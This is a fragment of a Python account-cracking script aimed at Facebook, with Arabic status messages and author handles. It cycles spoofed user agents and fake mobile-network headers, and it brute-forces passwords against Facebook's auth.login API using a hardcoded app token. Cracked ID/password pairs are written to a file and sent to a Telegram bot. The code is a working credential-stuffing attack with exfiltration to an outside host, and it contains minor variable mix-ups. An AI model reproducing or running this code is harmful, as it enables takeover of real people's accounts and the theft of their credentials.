Chrome/90.0.4278.24 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.3086.76 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3568.22 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.2323.40 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4376.81 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4199.45 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2900.15 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2678.96 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2142.67 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2735.63 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2703.48 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4760.67 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4335.95 Safari/537.36;]"])
        sys.stdout.write('\r \033[2;36m• \033[2;32mV I P \033[2;36m• \033[1;97m%s/%s \033[2;32mOK \033[1;33m>\033[1;34m> \033[2;32m%s • CP \033[2;36m>\033[1;33m> %s .....' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': rua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                cpkil = (''' - ❲ OK ابن بابل صـادلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n\n  ⁂ - ID ➛ %s \n\n\n  ⁂ - PASS ➛ %s \n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n  ⁂ - URL ➛ https://www.facebook.com/profile.php?id=%s&mibextid=ZbWKwL\n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n- BY◆ ➛ @gg_100k ~ @zizfif\n\t\t\t\t\t''' % (uid, pw,uid))
                print(okkil)
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-vip-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(okkil))
            
            if 'www.facebook.com' in response.json()['error_msg']:
                cpkil = (''' - ❲ OK ابن بابل صـادلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n\n  ⁂ - ID ➛ %s \n\n\n  ⁂ - PASS ➛ %s \n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n  ⁂ - URL ➛ https://www.facebook.com/profile.php?id=%s&mibextid=ZbWKwL\n\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n- BY◆ ➛ @gg_100k ~ @zizfif\n\t\t\t\t\t''' % (uid, pw,uid))
                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(cpkil))
                kilx = nel(cpkil,style='green')
                cetak(nel(kilx,style='red',title='حساب حلو مثلك'))
        self.loop += 1


tols_B7E_Vip()
